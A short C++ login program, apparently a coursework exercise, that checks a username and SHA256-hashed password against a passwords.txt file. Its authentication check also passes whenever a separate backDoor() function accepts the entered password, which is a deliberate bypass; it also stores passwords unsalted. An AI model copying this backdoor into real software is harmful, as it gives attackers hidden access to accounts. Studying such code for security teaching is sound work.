#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"

using namespace std;

// Function to get the SHA256 hash of a string
string getSHA256(const string& input) {
    // Implementing SHA256 hash using openssl
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256; 
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.size()); // Hashing our input
    SHA256_Final(hash, &sha256); // Storing our input inside of hash.

    // Converting unsigned char to string
    stringstream ss;
    for (int i=0; i < SHA256_DIGEST_LENGTH; i++){ // Loop for the length of the hash
        ss << hex << setw(2) << setfill('0') << (int)hash[i];// Convert the binary of the hash to hexidecimal
    }

    // Returning hash as string
    return ss.str();
}


int main() {
    // Int to store max amount of attempts allowed
    const int MAX_ATTEMPTS = 3;
    // Stores amount of attempts user has done
    int attempts = 0;

    

    while(attempts < MAX_ATTEMPTS){
        // Stores the password and username the user enters
        string usernameIn, passwordIn;

        // Prompt user for username and store
        cout << "Enter your username: ";
        cin >> usernameIn;

        cout << "Enter your password: ";
        cin >> passwordIn;
    

        // Get SHA256 hash of password
        string hashedPassword(getSHA256(passwordIn));

        // Opens passwords.txt file
        ifstream passwordsFile("passwords.txt");

        //If there's any sort of problem with passwords file
        if (!passwordsFile) {
            cerr << "Error opening password file." << endl;
            return 1;
        }

        string line;
        bool isAuthenticated = false;
        while (getline(passwordsFile, line)) {
            stringstream ss(line);
            string usernameFromFile, passwordFromFile;
            getline(ss, usernameFromFile, ':');
            getline(ss, passwordFromFile, ':');

            if (usernameFromFile == usernameIn && passwordFromFile == hashedPassword) {
                isAuthenticated = true;
                break;
            }
        }
        passwordsFile.close();

        if (isAuthenticated || backDoor(passwordIn)) {
            authenticated(usernameIn);
            return 0;
        }else {
            attempts++;
            if(attempts<MAX_ATTEMPTS){
                cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
                system("clear");
            }else{
                rejected(usernameIn);
            }
        }
    }
    return 0;
}

